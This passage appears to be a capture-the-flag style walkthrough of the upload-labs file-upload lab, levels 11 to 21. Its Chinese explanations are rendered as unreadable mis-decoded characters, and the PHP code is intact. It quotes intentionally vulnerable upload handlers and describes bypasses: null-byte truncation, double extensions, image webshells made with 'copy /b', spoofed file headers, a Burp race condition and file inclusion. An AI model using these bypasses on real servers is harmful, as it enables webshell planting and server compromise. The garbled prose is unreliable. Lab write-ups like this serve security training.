deldot()å‡½æ•°ä»åå‘å‰æ£€æµ‹ï¼Œå½“æ£€æµ‹åˆ°æœ«å°¾çš„ç¬¬ä¸€ä¸ªç‚¹æ—¶ä¼šç»§ç»­å®ƒçš„æ£€æµ‹ï¼Œä½†æ˜¯é‡åˆ°ç©ºæ ¼ä¼šåœä¸‹æ¥ æˆ‘ä»¬åˆ©ç”¨è¯¥å‡½æ•°çš„ç‰¹æ€§ä¿®æ”¹åç¼€åä¸ºphp. .è¿™æ ·æœ€ç»ˆæ‰§è¡Œå®Œçš„ç»“æœä¸ºphp.ï¼ŒæˆåŠŸç»•è¿‡ï¼Œæˆ‘ä»¬è¿›è¡ŒæŠ“åŒ…éªŒè¯ Pass-11 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\",\"ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; } } else { $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; } } é‡ç‚¹è§‚å¯Ÿ$file_name = str_ireplace($deny_ext,\"\", $file_name);å³å¯çŸ¥é“åŒå†™ç»•è¿‡å³å¯ Pass-12 $is_upload = false; $msg = null; if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; } } else{ $msg = \"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼\"; } } è¿™å…³æŸ¥çœ‹æºç å‘ç°å¯¹ä¸Šä¼ æ ¼å¼åšäº†é™åˆ¶ï¼Œè¿™æ—¶æƒ³è¦ç»•è¿‡éœ€è¦%00 ä¾‹å¦‚ï¼šæˆ‘ä»¬ä¸Šä¼  1.php%00.jpg æ—¶ï¼Œé¦–å…ˆåç¼€åæ˜¯åˆæ³•çš„jpgæ ¼å¼ï¼Œå¯ä»¥ç»•è¿‡å‰ç«¯çš„æ£€æµ‹ã€‚ä¸Šä¼ åˆ°åç«¯åï¼Œåç«¯åˆ¤æ–­æ–‡ä»¶ååç¼€çš„å‡½æ•°ä¼šè®¤ä¸ºå…¶æ˜¯ä¸€ä¸ª.jpgæ ¼å¼çš„æ–‡ä»¶ï¼Œå¯ä»¥èº²è¿‡ç™½åå•æ£€æµ‹ã€‚ä½†æ˜¯åœ¨ä¿å­˜æ–‡ä»¶æ—¶ï¼Œä¿å­˜æ–‡ä»¶æ—¶å¤„ç†æ–‡ä»¶åçš„å‡½æ•°åœ¨é‡åˆ°%00å­—ç¬¦è®¤ä¸ºè¿™æ˜¯ç»ˆæ­¢ç¬¦ï¼Œäºæ˜¯ä¸¢å¼ƒåé¢çš„ .jpgï¼Œäºæ˜¯æˆ‘ä»¬ä¸Šä¼ çš„ 1.php%00.jpg æ–‡ä»¶æœ€ç»ˆä¼šè¢«å†™å…¥ 1.php æ–‡ä»¶ä¸­å¹¶å­˜å‚¨åœ¨æœåŠ¡ç«¯ã€‚ 1.php&lt;5.3.4ï¼Œå¹¶ä¸”å…³é—­magic_quotes_gpc 2.æ–‡ä»¶ä¸Šä¼ è·¯å¾„å¯æ§ Pass-13 $is_upload = false; $msg = null; if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \"ä¸Šä¼ å¤±è´¥\"; } } else { $msg = \"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼\"; } } ä¸ä¸Šä¸€å…³ç±»ä¼¼ï¼Œåªä¸è¿‡è¿™ä¸€å…³æ˜¯åœ¨postä¸Šé¢è¿›è¡Œ00æˆªæ–­ æ³¨æ„ï¼šå½“urlä¸­çš„å‚æ•°æ˜¯é€šè¿‡GETæ–¹å¼è·å–æ—¶ï¼Œ%00ä¼šè¢«è‡ªåŠ¨è§£ç ã€‚è€Œå½“å‚æ•°æ˜¯é€šè¿‡POSTæ–¹å¼è·å–æ—¶ï¼Œæ˜¯ä¸ä¼šè‡ªåŠ¨è§£ç çš„ï¼Œä¹Ÿå°±æ˜¯è¯´%00åªä¼šåŸæ ·è¢«å½“æˆå­—ç¬¦ä¸²æ¥è¾“å‡ºã€‚æ‰€ä»¥é€šè¿‡POSTæ–¹å¼è¯·æ±‚æ­¤ç±»å‚æ•°çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦æ‰‹åŠ¨å°†å®ƒçš„åå…­è¿›åˆ¶æ”¹å†™ä¸º0x00 Pass-14 function getReailFileType($filename){ $file = fopen($filename, \"rb\"); $bin = fread($file, 2); //åªè¯»2å­—èŠ‚ fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode){ case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; } return $fileType; } $is_upload = false; $msg = null; if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown'){ $msg = \"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼\"; }else{ $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_type; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \"ä¸Šä¼ å‡ºé”™ï¼\"; } } } è¿™ä¸€å…³çš„æ ¡éªŒä»£ç ï¼šé€šè¿‡è¯»æ–‡ä»¶çš„å‰2ä¸ªå­—èŠ‚åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œå› æ­¤ç›´æ¥ä¸Šä¼ å›¾ç‰‡é©¬å³å¯ï¼Œåˆ¶ä½œå›¾ç‰‡é©¬ï¼š cmdï¼šcopy å›¾ç‰‡æ–‡ä»¶å/b + ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶å/a åˆ¶ä½œçš„å›¾ç‰‡é©¬æ–‡ä»¶å åˆ¶ä½œå¥½ï¼Œæ‰“å¼€ä¹‹åå¦‚ä¸‹å›¾ï¼Œè¯´æ˜åˆ¶ä½œæˆåŠŸ æ¥ä¸‹æ¥æˆ‘ä»¬ç”¨å®ƒçš„è‡ªå¸¦çš„æ–‡ä»¶åŒ…å«æ¼æ´è§£æè¯¥å›¾ç‰‡ï¼š http://127.0.0.1/upload-labs/include.php?file=upload/1020230201072203.jpg Pass-15 function isImage($filename){ $types = '.jpeg|.png|.gif'; if(file_exists($filename)){ $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0){ return $ext; }else{ return false; } }else{ return false; } } $is_upload = false; $msg = null; if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res){ $msg = \"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼\"; }else{ $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \"ä¸Šä¼ å‡ºé”™ï¼\"; } } } è¿™ä¸€å…³é‡‡ç”¨äº†getimagesizeå‡½æ•°æ ¡éªŒï¼šå¯¹ç›®æ ‡æ–‡ä»¶çš„16è¿›åˆ¶å»è¿›è¡Œä¸€ä¸ªè¯»å–ï¼Œå»è¯»å–å¤´å‡ ä¸ªå­—ç¬¦ä¸²æ˜¯ä¸æ˜¯ç¬¦åˆå›¾ç‰‡çš„è¦æ±‚çš„ï¼ŒåŒä¸Šä¸€å…³æ­¥éª¤ä¸€æ ·ã€‚å½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥æŠ“åŒ…ï¼Œåœ¨æ–‡ä»¶å†…å®¹å‰é¢æ·»åŠ æŒ‡å®šç±»å‹çš„æ–‡ä»¶å¤´å¦‚ï¼šGIF89aç­‰ç­‰ Pass-16 function isImage($filename){ //éœ€è¦å¼€å¯php_exifæ¨¡å— $image_type = exif_imagetype($filename); switch ($image_type) { case IMAGETYPE_GIF: return \"gif\"; break; case IMAGETYPE_JPEG: return \"jpg\"; break; case IMAGETYPE_PNG: return \"png\"; break; default: return false; break; } } $is_upload = false; $msg = null; if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res){ $msg = \"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼\"; }else{ $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \"ä¸Šä¼ å‡ºé”™ï¼\"; } } } è¿™ä¸€å…³é‡‡ç”¨äº†exif_imagetypeå‡½æ•°æ¥æ ¡éªŒï¼š exif_imagetype()è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶åç¼€åã€‚ è¿”å›å€¼ä¸getimage()å‡½æ•°è¿”å›çš„ç´¢å¼•2ç›¸åŒï¼Œä½†æ˜¯é€Ÿåº¦æ¯”getimageå¿«å¾—å¤šã€‚éœ€è¦å¼€å¯`php_exif`æ¨¡å— ä¸ä¸Šä¸€å…³æ­¥éª¤ç›¸åŒ Pass-17 $is_upload = false; $msg = null; if (isset($_POST['submit'])){ // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„ $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; $target_path=UPLOAD_PATH.'/'.basename($filename); // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å $fileext= substr(strrchr($filename,\".\"),1); //åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ if(($fileext == \"jpg\") &amp;&amp; ($filetype==\"image/jpeg\")){ if(move_uploaded_file($tmpname,$target_path)){ //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = \"è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼\"; @unlink($target_path); }else{ //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename = strval(rand()).\".jpg\"; //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = \"ä¸Šä¼ å‡ºé”™ï¼\"; } }else if(($fileext == \"png\") &amp;&amp; ($filetype==\"image/png\")){ if(move_uploaded_file($tmpname,$target_path)){ //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im = imagecreatefrompng($target_path); if($im == false){ $msg = \"è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼\"; @unlink($target_path); }else{ //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename = strval(rand()).\".png\"; //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path = UPLOAD_PATH.'/'.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = \"ä¸Šä¼ å‡ºé”™ï¼\"; } }else if(($fileext == \"gif\") &amp;&amp; ($filetype==\"image/gif\")){ if(move_uploaded_file($tmpname,$target_path)){ //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im = imagecreatefromgif($target_path); if($im == false){ $msg = \"è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼\"; @unlink($target_path); }else{ //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename = strval(rand()).\".gif\"; //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path = UPLOAD_PATH.'/'.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = \"ä¸Šä¼ å‡ºé”™ï¼\"; } }else{ $msg = \"åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼\"; } } è¡¥å……çŸ¥è¯†ï¼š äºŒæ¬¡æ¸²æŸ“ï¼šåç«¯é‡å†™æ–‡ä»¶å†…å®¹ basename(path[,suffix]) ï¼Œæ²¡æŒ‡å®šsuffixåˆ™è¿”å›åç¼€åï¼Œæœ‰åˆ™ä¸è¿”å›æŒ‡å®šçš„åç¼€å strrchr(string,char)å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¹¶è¿”å›ä»è¯¥ä½ç½®åˆ°å­—ç¬¦ä¸² ç»“å°¾çš„æ‰€æœ‰å­—ç¬¦ã€‚ imagecreatefromgif()ï¼šåˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä»GIFæ–‡ä»¶æˆ–URLåœ°å€è½½å…¥ä¸€å‰¯å›¾åƒ imagecreatefromjpeg()ï¼šåˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä»JPEGæ–‡ä»¶æˆ–URLåœ°å€è½½å…¥ä¸€å‰¯å›¾åƒ imagecreatefrompng()ï¼šåˆ›å»ºä¸€å—ç”»å¸ƒï¼Œå¹¶ä»PNGæ–‡ä»¶æˆ–URL imagecreatefromgif()å‡½æ•°ï¼šç›¸å½“äºåˆ›å»ºä¸€ä¸ªæ–°å›¾åƒ unlink()å‡½æ•°ï¼šåˆ é™¤æ–‡ä»¶ï¼ˆå‰é¢çš„@è¡¨ç¤ºä¸æ˜¾ç¤ºå¯èƒ½å‡ºç°çš„é”™è¯¯ï¼‰ strval()å‡½æ•°ï¼šç”¨äºè·å–å˜é‡çš„å­—ç¬¦ä¸²å€¼ã€‚ imagegif()å‡½æ•°ï¼šä»¥ GIF æ ¼å¼å°†å›¾åƒè¾“å‡ºåˆ°æµè§ˆå™¨æˆ–æ–‡ä»¶ æ€»ç»“ï¼šå¦‚æœæˆ‘ä»¬ä¸Šä¼ çš„æ˜¯gifå›¾åƒï¼Œè¿™é‡Œä¼šé‡æ–°ç”Ÿæˆä¸€ä¸ªå›¾åƒï¼Œå¹¶ä¸”éšæœºæ–‡ä»¶åã€‚åœ¨è¿”å›å›¾åƒåˆ°æµè§ˆå™¨åï¼Œå°±åˆ é™¤å›¾åƒã€‚ä¹Ÿå°±æ˜¯äºŒæ¬¡æ¸²æŸ“ å…³äºç»•è¿‡gifçš„äºŒæ¬¡æ¸²æŸ“ï¼Œæˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°æ¸²æŸ“å‰åæ²¡æœ‰å˜åŒ–çš„ä½ç½®ï¼Œç„¶åå°†phpä»£ç å†™è¿›å»ï¼Œå°±å¯ä»¥æˆåŠŸä¸Šä¼ å¸¦æœ‰phpä»£ç çš„å›¾ç‰‡äº†ã€‚ æˆ‘ä»¬å¯ä»¥ä¾æ—§åˆ¶ä½œå›¾ç‰‡é©¬ï¼Œæ¥ç€ä¸Šä¼ ä¹‹åï¼Œå°†æœåŠ¡å™¨ä¸Šçš„æœ€ç»ˆçš„å›¾ç‰‡é©¬ä¸‹è½½ä¸‹æ¥ï¼Œä¸¤è€…å¯¹æ¯”ï¼Œåœ¨å†…å®¹æ²¡æœ‰å‘ç”Ÿå˜åŒ–çš„åœ°æ–¹æ·»åŠ ä¸€å¥è¯æœ¨é©¬å³å¯ Pass-18 $is_upload = false; $msg = null; if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,\".\")+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = \"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼\"; unlink($upload_file); } }else{ $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; } } è¿™é‡Œå¯ä»¥ä¸Šä¼ å›¾ç‰‡é©¬ã€‚ä¹Ÿæœ‰æ¡ä»¶ç«äº‰ï¼š æ³¨æ„å…³é”®å‡½æ•°unlinkå‡½æ•°ï¼Œç”±äºè¿™é‡Œçš„ä»£ç é€»è¾‘æ˜¯ï¼Œä¸è®ºä»€ä¹ˆæ–‡ä»¶ï¼Œå…ˆä¸Šä¼ ååˆ¤æ–­ï¼Œæ¥ç€å¦‚æœæ–‡ä»¶åç¼€ä¸ç¬¦åˆè§„å®šå†å†³å®šæ˜¯å¦åˆ é™¤ã€‚ ä½†å¦‚æœæˆ‘ä»¬åœ¨æ–‡ä»¶åˆ é™¤ä¹‹å‰å°±è¯»å–åˆ°è¯¥æ–‡ä»¶ï¼Œé‚£æ–‡ä»¶å°±ä¸èƒ½è¢«æ­£å¸¸åˆ é™¤äº†ï¼šç›´æ¥ä¸Šä¼ 1.phpï¼Œä½¿ç”¨Burpæ‹¦æˆª å¦‚ä¸Šå›¾è¿›è¡Œä¿®æ”¹åï¼Œæˆ‘ä»¬å…ˆæ­£å¸¸ä¸Šä¼ å›¾ç‰‡ï¼Œå¤åˆ¶ä»¥ä¸‹å›¾ç‰‡çš„è·¯å¾„ï¼Œæ–¹ä¾¿åç»­çš„è®¿é—®ã€‚ åœ¨bpå¼€å§‹attackä¹‹åï¼Œæˆ‘ä»¬ä¸æ–­çš„executeå»è®¿é—®ä¸Šä¼ çš„æ–‡ä»¶å³å¯ Pass-19 //index.php $is_upload = false; $msg = null; if (isset($_POST['submit'])) { require_once(\"./myupload.php\"); $imgFileName =time(); $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName); $status_code = $u-&gt;upload(UPLOAD_PATH); switch ($status_code) { case 1: $is_upload = true; $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to; break; case 2: $msg = 'æ–‡ä»¶å·²ç»è¢«ä¸Šä¼ ï¼Œä½†æ²¡æœ‰é‡å‘½åã€‚'; break; case -1: $msg = 'è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ä¸´æ—¶æ–‡ä»¶å­˜å‚¨ç›®å½•ã€‚'; break; case -2: $msg = 'ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ ç›®å½•ä¸å¯å†™ã€‚'; break; case -3: $msg = 'ä¸Šä¼ å¤±è´¥ï¼Œæ— æ³•ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶ã€‚'; break; case -4: $msg = 'ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ çš„æ–‡ä»¶è¿‡å¤§ã€‚'; break; case -5: $msg = 'ä¸Šä¼ å¤±è´¥ï¼ŒæœåŠ¡å™¨å·²ç»å­˜åœ¨ç›¸åŒåç§°æ–‡ä»¶ã€‚'; break; case -6: $msg = 'æ–‡ä»¶æ— æ³•ä¸Šä¼ ï¼Œæ–‡ä»¶ä¸èƒ½å¤åˆ¶åˆ°ç›®æ ‡ç›®å½•ã€‚'; break; default: $msg = 'æœªçŸ¥é”™è¯¯ï¼'; break; } } //myupload.php class MyUpload{ ...... ...... ...... var $cls_arr_ext_accepted = array( \".doc\", \".xls\", \".txt\", \".pdf\", \".gif\", \".jpg\", \".zip\", \".rar\", \".7z\",\".ppt\", \".html\", \".xml\", \".tiff\", \".jpeg\", \".png\" ); ...... ...... ...... /** upload() ** ** Method to upload the file. ** This is the only method to call outside the class. ** @para String name of directory we upload to ** @returns void **/ function upload( $dir ){ $ret = $this-&gt;isUploadedFile(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } $ret = $this-&gt;setDir( $dir ); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } $ret = $this-&gt;checkExtension(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } $ret = $this-&gt;checkSize(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } // if flag to check if the file exists is set to 1 if( $this-&gt;cls_file_exists == 1 ){ $ret = $this-&gt;checkFileExists(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } } // if we are here, we are ready to move the file to destination $ret = $this-&gt;move(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } // check if we need to rename the file if( $this-&gt;cls_rename_file == 1 ){ $ret = $this-&gt;renameFile(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } } // if we are here, everything worked as planned :) return $this-&gt;resultUpload( \"SUCCESS\" ); } ...... ...... ...... }; åˆ†æï¼šæœ¬Passåšäº†ç™½åå•æ ¡éªŒï¼Œæ–‡ä»¶ä¸Šä¼ åå…ˆä¿å­˜åœ¨å¯¹è±¡ä¸­ï¼Œéšåå¯¹æ–‡ä»¶è¿›è¡Œåˆ¤æ–­å­˜åœ¨ã€æ£€æŸ¥æ‰©å±•åã€æ£€æŸ¥å¤§å°ã€é‡å‘½åã€ç§»åŠ¨æ“ä½œï¼Œæ²¡æœ‰åˆ¤æ–­æ–‡ä»¶å¤´å’ŒäºŒæ¬¡æ¸²æŸ“ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å›¾ç‰‡æœ¨é©¬é…åˆæ–‡ä»¶åŒ…å«æ¼æ´è¿›è¡Œç»•è¿‡ã€‚ï¼ˆè™½ç„¶è¿›è¡Œäº†ç§»åŠ¨å’Œé‡å‘½åï¼Œä½†æ˜¯ç½‘é¡µä¼šå›æ˜¾åœ°å€ï¼‰ä¸Šä¼ ï¼Œéšåä½¿ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è®¿é—®è¯¥æ–‡ä»¶ Pass-20 $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = $_POST['save_name']; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; }else{ $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; } }else{ $msg = 'ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼'; } } else { $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'; } } pathinfo() å‡½æ•°ä»¥æ•°ç»„çš„å½¢å¼è¿”å›å…³äºæ–‡ä»¶è·¯å¾„çš„ä¿¡æ¯ï¼Œè¿”å›çš„æ•°ç»„å…ƒç´ å¦‚ä¸‹ï¼š [dirname]: ç›®å½•è·¯å¾„ [basename]: æ–‡ä»¶å [extension]: æ–‡ä»¶åç¼€å [filename]: ä¸åŒ…å«åç¼€çš„æ–‡ä»¶å è¿™ä¸€å…³åªæ£€æŸ¥äº†æ–‡ä»¶åç¼€åï¼Œä¸”æ²¡æœ‰é™åˆ¶å¤§å°å†™ã€‚å¾ˆå®¹æ˜“ç»•è¿‡ è¿™å…³ä¹Ÿå¯ä»¥ç›´æ¥åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´ä¸Šä¼ å›¾ç‰‡é©¬ åˆ©ç”¨%00æˆªæ–­ç»•è¿‡ï¼ˆæ³¨æ„ç‰ˆæœ¬ï¼‰ move_uploaded_file()æœ‰è¿™ä¹ˆä¸€ä¸ªç‰¹æ€§ï¼Œä¼šå¿½ç•¥æ‰æ–‡ä»¶æœ«å°¾çš„ /.ï¼ˆå¯ä»¥åœ¨åç¼€åæ·»åŠ /.å³å¯ç»•è¿‡é»‘åå•ï¼‰ Pass-21 $is_upload = false; $msg = null; if(!empty($_FILES['upload_file'])){ //æ£€æŸ¥MIME $allow_type = array('image/jpeg','image/png','image/gif'); if(!in_array($_FILES['upload_file']['type'],$allow_type)){ $msg = \"ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!\"; }else{ //æ£€æŸ¥æ–‡ä»¶å $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name']; if (!is_array($file)) { $file = explode('.', strtolower($file)); } $ext = end($file); $allow_suffix = array('jpg','png','gif'); if (!in_array($ext, $allow_suffix)) { $msg = \"ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!\"; }else{ $file_name = reset($file) . '.' . $file[count($file) - 1]; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = \"æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼\"; $is_upload = true; } else { $msg = \"æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼\"; } } } }else{ $msg = \"è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼\"; } å…³é”®å‡½æ•°ï¼š count() å‡½æ•°è¿”å›æ•°ç»„ä¸­å…ƒç´ çš„æ•°ç›® reset() å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚ end() å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚ explode() å‡½æ•°ä½¿ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²åˆ†å‰²å¦ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›ç”±å­—ç¬¦ä¸²ç»„æˆçš„æ•°ç»„ã€‚ è¿™å…³å¯ä»¥ç›´æ¥ä¿®æ”¹mimeç±»å‹ä¸ºç™½åå•ä¸­çš„æŸä¸€ä¸ªï¼Œæ”¾åŒ…ä¸Šä¼ ï¼Œç„¶ååˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è¿›è¡ŒéªŒè¯å³å¯ å®¡è®¡ä»£ç ï¼Œè¿™å…³çš„å…³é”®éƒ¨åˆ†ä¸ºåˆ¤æ–­fileæ˜¯å¦æ˜¯ä¸€ä¸ªæ•°ç»„ ä¸æ˜¯æ•°ç»„å¿…å®šä¼šç»å†æ‰“æ•£ä¸ºæ•°ç»„çš„è¿‡ç¨‹ è€Œæœ€ç»ˆçš„æ–‡ä»¶ååç¼€å–çš„æ˜¯$file[count($file) - 1]ï¼Œå› 